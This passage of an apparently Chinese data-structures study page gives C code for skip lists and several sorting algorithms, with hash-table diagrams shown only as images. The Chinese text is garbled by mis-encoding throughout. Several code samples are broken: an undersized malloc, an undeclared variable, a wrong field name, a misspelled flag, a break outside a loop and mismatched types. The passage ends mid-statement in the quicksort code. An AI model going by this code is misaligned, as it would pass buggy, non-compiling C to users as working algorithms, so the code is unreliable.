title="å»ºç«‹å’ŒæŸ¥æ‰¾"></a>å»ºç«‹å’ŒæŸ¥æ‰¾</h3><ul><li>ç±»å‹å®šä¹‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEVEL 6<span class="comment">//å®šä¹‰æœ€å¤§å±‚æ•°</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType</span><br><span class="line"><span class="comment">//è·³è·ƒé“¾è¡¨ç»“ç‚¹ç»“æ„å®šä¹‰</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> level;<span class="comment">//ç»“ç‚¹å±‚æ•°</span></span><br><span class="line">    KeyType key;<span class="comment">//ç»“ç‚¹çš„å€¼</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>[<span class="title">MAX_LEVEL</span>];</span><span class="comment">//æŒ‡é’ˆæ•°ç»„</span></span><br><span class="line">&#125;*PNode;</span><br><span class="line"><span class="comment">//è·³è·ƒé“¾è¡¨ç»“æ„å®šä¹‰</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num;<span class="comment">//è·³è·ƒé“¾è¡¨æ•°æ®ä¸ªæ•°</span></span><br><span class="line">    <span class="type">int</span> maxLevel;<span class="comment">//è·³è·ƒé“¾è¡¨æœ€å¤§å±‚æ•°</span></span><br><span class="line">    PNode head;<span class="comment">//è·³è·ƒé“¾è¡¨çš„å¤´æŒ‡é’ˆ</span></span><br><span class="line">&#125;*SkipList;</span><br></pre></td></tr></table></figure><ul><li>å»ºç«‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">SkipList <span class="title function_">SetNullSkipList</span><span class="params">(<span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">    SkipList <span class="built_in">list</span> = (SkipList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SkipList));</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;num = <span class="number">0</span>;<span class="comment">//è·³è·ƒé“¾è¡¨è®¡æ•°å™¨ç½®é›¶</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;maxLevel = level;<span class="comment">//è·³è·ƒé“¾è¡¨å±‚æ•°</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head = CreateNode(level,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">list</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;level;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>-&gt;head-&gt;next[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PNode <span class="title function_">CreateNode</span><span class="params">(<span class="type">int</span> level,KeyType key)</span><span class="comment">//ç”Ÿæˆä¸€ä¸ªæ–°ç»“ç‚¹</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PNode) + <span class="keyword">sizeof</span>(PNode)*level);</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;level = level;</span><br><span class="line">    p-&gt;key = key;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æŸ¥æ‰¾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">SkipListSearch</span><span class="params">(SkipList <span class="built_in">list</span>,KeyType key)</span><span class="comment">//æŒ‰å€¼æŸ¥æ‰¾</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;</span><br><span class="line">    q = <span class="literal">NULL</span>;</span><br><span class="line">    p = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">list</span>-&gt;maxLevel <span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((q = p-&gt;next[i]) &amp;&amp; (q-&gt;key &lt;= key))<span class="comment">//æ¨ªå‘æ¯”è¾ƒ</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = q;</span><br><span class="line">            n++;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;key == key)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ’å…¥å’Œåˆ é™¤"><a href="#æ’å…¥å’Œåˆ é™¤" class="headerlink" title="æ’å…¥å’Œåˆ é™¤"></a>æ’å…¥å’Œåˆ é™¤</h3><blockquote><p>æœ‰ç©ºè¡¥</p></blockquote><h2 id="æ•£åˆ—è¡¨"><a href="#æ•£åˆ—è¡¨" class="headerlink" title="æ•£åˆ—è¡¨"></a>æ•£åˆ—è¡¨</h2><h3 id="æ•£åˆ—å‡½æ•°å’Œå†²çª"><a href="#æ•£åˆ—å‡½æ•°å’Œå†²çª" class="headerlink" title="æ•£åˆ—å‡½æ•°å’Œå†²çª"></a>æ•£åˆ—å‡½æ•°å’Œå†²çª</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218045225.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218045305.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218050453.png"></p><p> <img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218051049.png"></p><h3 id="æ•£åˆ—è¡¨çš„å»ºç«‹ã€æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤"><a href="#æ•£åˆ—è¡¨çš„å»ºç«‹ã€æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤" class="headerlink" title="æ•£åˆ—è¡¨çš„å»ºç«‹ã€æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤"></a>æ•£åˆ—è¡¨çš„å»ºç«‹ã€æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤</h3><ul><li>æŸ¥æ‰¾</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218051339.png"></p><ul><li>æ’å…¥</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218052735.png"></p><ul><li>åˆ é™¤</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218052836.png"></p><h1 id="ç¬¬ä¹ç« -æ’åº"><a href="#ç¬¬ä¹ç« -æ’åº" class="headerlink" title="ç¬¬ä¹ç«  æ’åº"></a>ç¬¬ä¹ç«  æ’åº</h1><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218053313.png"></p><ul><li>å¾…æ’åºçš„è®°å½•ï¼Œé‡‡ç”¨é¡ºåºå­˜å‚¨ç»“æ„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RECORDTYPE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KeyType key;<span class="comment">//å…³é”®å­—</span></span><br><span class="line">    InfoType otherInfo;<span class="comment">//å…¶ä»–æ•°æ®ä¿¡æ¯</span></span><br><span class="line">&#125;RecordType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SORTARRAY_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> cnt;<span class="comment">//è®°å½•æ’åºæ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">    RecordType *recordArr;<span class="comment">//æŒ‡å‘ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;SortArr;</span><br></pre></td></tr></table></figure><ul><li>äº¤æ¢å‡½æ•°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(SortArr* sortArr,<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType temp;</span><br><span class="line">    temp = sortArr-&gt;recordArr[i].key;</span><br><span class="line">    sortArr-&gt;recordArr[i].key = sortArr-&gt;recordArr[j].key;</span><br><span class="line">    sortArr-&gt;recordArr[j].key = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ’å…¥ç±»æ’åº"><a href="#æ’å…¥ç±»æ’åº" class="headerlink" title="æ’å…¥ç±»æ’åº"></a>æ’å…¥ç±»æ’åº</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218054123.png"></p><h3 id="ç›´æ¥æ’å…¥æ’åº"><a href="#ç›´æ¥æ’å…¥æ’åº" class="headerlink" title="ç›´æ¥æ’å…¥æ’åº"></a>ç›´æ¥æ’å…¥æ’åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecordType temp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = i - <span class="number">1</span>;<span class="comment">//jæ˜¯å·²ç»æ’å¥½é¡ºåºçš„æ•°æ®æœ€åä¸€ä¸ªå…ƒç´ çš„ä¸‹æ ‡</span></span><br><span class="line">        temp = sortArr-&gt;recordArr[i];<span class="comment">//ç­‰å¾…æ’å…¥çš„æ•°æ®temp</span></span><br><span class="line">        <span class="comment">//ä»jä½ç½®å¼€å§‹ï¼Œä»åå‘å‰åœ¨å·²ç»æ’å¥½é¡ºåºçš„åºåˆ—ä¸­æ‰¾åˆ°æ’å…¥ä½ç½®</span></span><br><span class="line">        <span class="keyword">while</span>(temp.key&lt;sortArr-&gt;recordArr[j].key &amp;&amp; j&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sortArr-&gt;recordArr[j+<span class="number">1</span>] = sortArr-&gt;recordArr[j];<span class="comment">//å¾…æ’å…¥å…ƒç´ æ¯”æœ‰åºåºåˆ—ä¸­å…ƒç´ å°ï¼Œæœ‰åºåºåˆ—ä¸­å…ƒç´ å¾€å‰ç§»</span></span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ‰¾åˆ°å¾…æ’å…¥ä½ç½®ä¸º j+1</span></span><br><span class="line">        <span class="comment">//å¦‚æœå¾…æ’å…¥ä½ç½®æ­£å¥½å°±æ˜¯è¦æ’å…¥å…ƒç´ æ‰€åœ¨ä½ç½®åˆ™å¯ä»¥ä¸è¿›è¡Œæ•°æ®èµ‹å€¼</span></span><br><span class="line">        <span class="keyword">if</span>((j+<span class="number">1</span>) != i)</span><br><span class="line">            sortArr-&gt;recordArr[j+<span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯<code>ç¨³å®š</code>çš„</li><li>é€‚ç”¨äº<code>nè¾ƒå°</code>çš„åºåˆ—</li></ul><h3 id="äºŒåˆ†æ’å…¥æ’åº"><a href="#äºŒåˆ†æ’å…¥æ’åº" class="headerlink" title="äºŒåˆ†æ’å…¥æ’åº"></a>äºŒåˆ†æ’å…¥æ’åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BinSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> low,mid,high;</span><br><span class="line">    RecordType temp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = sortArr-&gt;recordArr[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;<span class="comment">//åŒºåˆ†å·¦å³è¾¹ç•Œ</span></span><br><span class="line">        <span class="keyword">while</span>(low &lt;=high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(temp.key &lt;sortArr-&gt;recordArr[mid].key)</span><br><span class="line">                high = mid - <span class="number">1</span>;<span class="comment">//å¾…æ’åºçš„å€¼æ¯”ä¸­é—´ä½ç½®çš„å€¼å°ï¼Œåœ¨å‰åŠåŒºæŸ¥æ‰¾</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å¦‚æœå¾…æ’å…¥æ•°æ®æ­£å¥½åœ¨è¿˜è¦æ’å…¥çš„ä½ç½®ä¸Šå°±ä¸ç”¨æ’å…¥</span></span><br><span class="line">        <span class="keyword">if</span>(low != i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœéœ€è¦æŒªåŠ¨æ•°æ®ï¼Œç©ºå‡ºä½ç½®ï¼Œæ’å…¥æ•°æ®</span></span><br><span class="line">            <span class="comment">//æ‰¾åˆ°æ’å…¥ä½ç½®åï¼Œç§»åŠ¨æ•°æ®ï¼Œç©ºå‡ºä½ç½®</span></span><br><span class="line">            <span class="keyword">for</span>(j = i - <span class="number">1</span>;j&gt;=low;j--)</span><br><span class="line">                sortArr-&gt;recordArr[j+<span class="number">1</span>] = sortArr-&gt;recordArr[j];</span><br><span class="line">            sortArr-&gt;recordArr[low] = temp;<span class="comment">//æ’å…¥æ•°æ®</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯<code>ç¨³å®š</code>çš„</li><li><code>é“¾è¡¨æ— æ³•æŠ˜åŠ</code></li></ul><h3 id="è¡¨æ’å…¥æ’åº"><a href="#è¡¨æ’å…¥æ’åº" class="headerlink" title="è¡¨æ’å…¥æ’åº"></a>è¡¨æ’å…¥æ’åº</h3><blockquote><p>ä»¥åæœ‰ç©ºè¡¥</p></blockquote><h3 id="å¸Œå°”æ’åº"><a href="#å¸Œå°”æ’åº" class="headerlink" title="å¸Œå°”æ’åº"></a>å¸Œå°”æ’åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ShellSort</span><span class="params">(SortArr* sortArr,<span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,increment;<span class="comment">//incrementè®°å½•å½“å‰èººçš„å¢é‡</span></span><br><span class="line">    RecordType temp;<span class="comment">//ä¿å­˜å¾…æ’åºè®°å½•</span></span><br><span class="line">    <span class="keyword">for</span>(increment = d;increment&gt;<span class="number">0</span>;increment /= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = increment;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = sortArr-&gt;recordArr[i];<span class="comment">//ä¿å­˜å¾…æ’åºè®°å½•</span></span><br><span class="line">            j = i - increment;<span class="comment">//jæŒ‰ç…§å¢é‡è¿›è¡Œå˜åŒ–</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; temp.key&lt;sortArr-&gt;recordArr[j].key)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//è®°å½•æŒ‰ç…§å¢é‡é—´éš”å‘åç§»åŠ¨</span></span><br><span class="line">                sortArr-&gt;recordArr[j+increment] = sortArr-&gt;recordArr[j];</span><br><span class="line">                j -= increment;<span class="comment">//jæŒ‰ç…§å¢é‡è¿›è¡Œå˜åŒ–</span></span><br><span class="line">            &#125;</span><br><span class="line">            sortArr-&gt;recordArr[j+increment] = temp;<span class="comment">//æ’å…¥å¾…æ’åºè®°å½•</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯ä¸ç¨³å®šçš„</li></ul><h2 id="é€‰æ‹©ç±»æ’åº"><a href="#é€‰æ‹©ç±»æ’åº" class="headerlink" title="é€‰æ‹©ç±»æ’åº"></a>é€‰æ‹©ç±»æ’åº</h2><h3 id="ç›´æ¥é€‰æ‹©æ’åº"><a href="#ç›´æ¥é€‰æ‹©æ’åº" class="headerlink" title="ç›´æ¥é€‰æ‹©æ’åº"></a>ç›´æ¥é€‰æ‹©æ’åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SelectSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> minPos;<span class="comment">//è®°å½•æœ€å°å…ƒç´ çš„ä¸‹æ ‡</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;sortArr-&gt;count<span class="number">-1</span>;i++)<span class="comment">//n-1èººçš„é€‰æ‹©æ’åº</span></span><br><span class="line">    &#123;</span><br><span class="line">        minPos = i;<span class="comment">//è®°å½•æœ€å°çš„å€¼æ‰€åœ¨çš„æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">        <span class="keyword">for</span>(j = i+<span class="number">1</span>;j&lt;sortArr-&gt;count;j++)<span class="comment">//åœ¨æ— åºåŒºåŸŸä¸­å¯»æ‰¾</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(sortArr-&gt;recordArr[j].key &lt; sortArr-&gt;recordArr[minPos].key)</span><br><span class="line">                minPos = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(minPos != i)<span class="comment">//è¯´æ˜éœ€è¦äº¤æ¢</span></span><br><span class="line">            Swap(sortArr,minPos,i);<span class="comment">//è°ƒç”¨äº¤æ¢å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯<code>ä¸ç¨³å®š</code>çš„</li></ul><h3 id="å †æ’åº"><a href="#å †æ’åº" class="headerlink" title="å †æ’åº"></a>å †æ’åº</h3><ul><li>æ ¹ç»“ç‚¹å¤§äºå…¶å·¦å³å­©å­â€”â€”<code>å¤§æ ¹å †</code></li><li>æ ¹ç»“ç‚¹å°äºå…¶å·¦å³å­©å­â€”â€”<code>å°æ ¹å †</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>åé¢å†è¡¥</p></blockquote><h2 id="äº¤æ¢ç±»æ’åº"><a href="#äº¤æ¢ç±»æ’åº" class="headerlink" title="äº¤æ¢ç±»æ’åº"></a>äº¤æ¢ç±»æ’åº</h2><h3 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ­¤ç®—æ³•ä¸ºå†’å°æ³¡ï¼Œæ¯æ¬¡æŠŠæœ€å°çš„ç§»åŠ¨åˆ°æœ€å·¦è¾¹</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(SortArr *sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> hasSwap = <span class="number">0</span>;<span class="comment">//æ ‡å¿—ï¼Œç”¨äºæ£€æµ‹å†…å¾ªç¯æ˜¯å¦è¿˜æœ‰æ•°æ®äº¤æ¢</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        hasSwap = <span class="number">0</span>;<span class="comment">//æ¯è¶Ÿå¼€å§‹é‡æ–°è®¾ç½®äº¤æ¢æ ‡å¿—ä¸º 0 </span></span><br><span class="line">        <span class="comment">//jæ˜¯ä»åå¾€å‰å¾ªç¯ï¼Œæ•°ç»„çš„ä¸‹æ ‡æ˜¯ 0 åˆ° count - 1</span></span><br><span class="line">        <span class="keyword">for</span>(j = sortArr-&gt;count - <span class="number">1</span>;j&gt;=i;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//è‹¥å‰è€…å¤§äºåè€…</span></span><br><span class="line">            <span class="keyword">if</span>(sortArr-&gt;recordArr[j<span class="number">-1</span>].key&gt;sortArr-&gt;recordArr[j].key)</span><br><span class="line">            &#123;</span><br><span class="line">                Swap(sortArr,j,j<span class="number">-1</span>);</span><br><span class="line">                hsaSwap = <span class="number">1</span>;<span class="comment">//æœ‰äº¤æ¢åˆ™è®¾ç½®ä¸º 1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!hasSwap)<span class="comment">//æœ¬èººæ²¡æœ‰å‘ç”Ÿäº¤æ¢</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®—æ³•æ˜¯<code>ç¨³å®š</code>çš„</li></ul><h3 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218184027.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218185500.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">quickSort</span><span class="params">(SortObject *pvector,<span class="type">int</span> l,<span class="type">int</span> r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecordNode temp;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r)<span class="comment">//åªæœ‰ä¸€ä¸ªè®°å½•æˆ–æ— è®°å½•ï¼Œä¸ç”¨æ’åº</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    i = l;</span><br><span class="line">    j = r;</span><br><span class="line">    temp = pvector-&gt;record[i];<span class="comment">//æŠŠæ¢è½´æ”¾åˆ°tempé‡Œé¢</span></span><br><span class="line">    <span class="keyword">while</span>(i!=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((pvector-&gt;record[j].key &gt;= temp.key) &amp;&amp; (j&gt;i))</span><br><span class="line">            j--;<span class="comment">//ä»å³å‘å·¦æ‰«æï¼Œç›´åˆ°æŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªå°äºtemp.keyçš„è®°å½•</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">            pvector-&gt;record[i++] = 